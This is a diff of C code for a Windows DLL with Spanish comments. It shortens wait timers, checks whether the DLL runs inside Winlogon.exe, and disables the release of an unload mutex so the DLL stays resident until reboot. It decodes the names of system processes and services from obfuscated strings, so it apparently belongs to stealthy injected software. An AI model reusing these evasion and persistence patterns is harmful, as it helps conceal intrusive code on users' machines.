@@ -161,8 +161,10 @@ VOID UnloadDLL(void){
 	ReleaseMutex(hWorkingMutex);
 	CloseHandle(hWorkingMutex);
 
-	ReleaseMutex(hUnloadMutex);
-	CloseHandle(hUnloadMutex);
+	//Con lo siguiente commentado, el mutex se queda cargado en memoria,
+	//y habria que reiniciar la pc para que se carge nuevamente la dll
+	/*ReleaseMutex(hUnloadMutex);
+	CloseHandle(hUnloadMutex);*/
 
 	TerminateThread(hThreadMonitor, 0);
 	CloseHandle(hThreadMonitor);
@@ -586,8 +588,7 @@ DWORD CheckMutex(LPVOID lpParam){
 	DecodeString ds;
 
 	//Tiempo para que el proceso inicie
-	//Sleep(5000);
-	if(WaitAndCheckUnloadMutex(5, 1000))
+	if(WaitAndCheckUnloadMutex(2, 500))
 		UnloadDLL();
 
 	#ifdef COMPILE_WITH_HANDLE_EXCEPTION
@@ -606,20 +607,20 @@ DWORD CheckMutex(LPVOID lpParam){
 
 	//Chequeo para iniciar en Winlogon.exe y servicio lanmanserver
 	if(!GetModuleFileNameEx(GetCurrentProcess(), NULL, (LPSTR)lpszProc, MAX_PATH)){
-		if(WaitAndCheckUnloadMutex(45, 1000))
+		if(WaitAndCheckUnloadMutex(30, 1000))
 			UnloadDLL();
 	}
 	else{
 		if(!strstr(strupr((LPSTR)lpszProc), ds.getDecodeString((LPSTR)encStr_Windows_System32_Winlogon))){
-			if(WaitAndCheckUnloadMutex(45, 1000))
+			if(WaitAndCheckUnloadMutex(30, 1000))
 				UnloadDLL();
 		}
 	}
 
 	while((dwServiceState = GetServiceState(ds.getDecodeString((LPSTR)encStr_lanmanserver))) != SERVICE_RUNNING){
-		if(WaitAndCheckUnloadMutex(1, 1000))
+		if(WaitAndCheckUnloadMutex(2, 500))
 			UnloadDLL();
-		if((++dwTimeCounter) >= 40) break;
+		if((++dwTimeCounter) >= 15) break;
 	}
 
 	secAttr.bInheritHandle = FALSE;
@@ -653,7 +654,7 @@ DWORD CheckMutex(LPVOID lpParam){
 		}
 		//}
 
-		if(WaitAndCheckUnloadMutex(1, 1000))
+		if(WaitAndCheckUnloadMutex(2, 500))
 			UnloadDLL();
 	}
 
